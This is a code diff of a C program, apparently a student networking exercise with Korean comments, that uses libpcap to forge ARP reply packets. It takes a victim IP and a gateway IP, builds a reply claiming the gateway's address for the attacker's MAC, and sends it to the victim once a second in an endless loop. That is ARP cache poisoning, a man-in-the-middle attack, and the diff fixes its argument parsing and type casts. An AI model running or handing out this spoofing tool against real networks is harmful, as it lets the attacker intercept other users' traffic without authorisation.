@@ -72,7 +72,7 @@ void getSendMac(u_char* MAC, const u_char* pck){
     }
 }
 
-int getMyMac(char* myMac){
+int getMyMac(u_char* myMac){
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
@@ -172,16 +172,45 @@ void createPacket(packet_type *pck){
 }
 
 
-int main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]) {
     //{interface sender_ip target_ip}
     // - victimip, gateway
+    if (argc != 4) {
+        printf("--Wrong arguments---\n %s <interface> <sender_IP> <gateway_IP>\n", argv[0]);
+        return -5;
+    }
     //TODO packet에서 srcMAC를 gateway(target_ip의 MAC)로
     // dstMAC을 sender_ip의 MAC으로
     packet_type pck;
 
-    char* sender_ip = strtok(argv[2], ".");
-    char* gateway_ip = strtok(argv[3], ".");
+    u_char sender_ip[4];
+    u_char gateway_ip[4];
+
+    // sender_ip와 gateway_ip에 argv값을 전달
+    {
+        char* temp;
+        temp = strtok(argv[2], ".");
+        sender_ip[0] = atoi(temp);
+        for(int i= 1; i<IP_SIZE; i++){
+            sender_ip[i] = atoi(strtok(NULL, "."));
+        }
+
+        temp = strtok(argv[3], ".");
+        gateway_ip[0] = atoi(temp);
+        for(int i= 1; i<IP_SIZE; i++){
+            gateway_ip[i] = atoi(strtok(NULL, "."));
+        }
+
+    }
+
+    for(int i = 0; i<IP_SIZE; i++){
+        printf("%d.", sender_ip[i]);
+    }
+    printf("\n");
+    for(int i = 0; i<IP_SIZE; i++){
+        printf("%d.", gateway_ip[i]);
+    }
+    printf("\n\n\n");
 
     const u_char* ucp_DATA;
     pcap_t *stp_NIC;
@@ -207,8 +236,7 @@ int main(int argc, char *argv[])
     u_char DstMAC[6];
     packet_type data;
     createPacket(&data);
-
-    modifyTargetIP(&data, sender_ip);
+    modifyTargetIP(&data, (u_char*)sender_ip);
 
     // TODO argv로 온 값 대체하기
     // 구조체화 시키기
@@ -230,8 +258,8 @@ int main(int argc, char *argv[])
     // 패킷수정해서 보내자
     // Dest MAC과 Target MAC이 sender MAC
     modifyETHSource(&data, myMac);
-    modifySenderIP(&data, gateway_ip);
-    modifyTargetIP(&data, sender_ip);
+    modifySenderIP(&data, (u_char*)gateway_ip);
+    modifyTargetIP(&data, (u_char*)sender_ip);
     modifyOP(&data, ARP_REPLY);
     modifyTargetMAC(&data, DstMAC);
     modifyETHDestination(&data, DstMAC);
@@ -251,6 +279,7 @@ int main(int argc, char *argv[])
     printf("\nPress ^c to Exit.");
     while(true){
         pcap_sendpacket(handle, (const u_char*) &data, 42);
+        printf("packet send\n");
         sleep(1);
     }
 }
@@ -265,5 +294,5 @@ int main(int argc, char *argv[])
           */
 
 
-    //계속보낼때
-    // sender ip:
+//계속보낼때
+// sender ip:
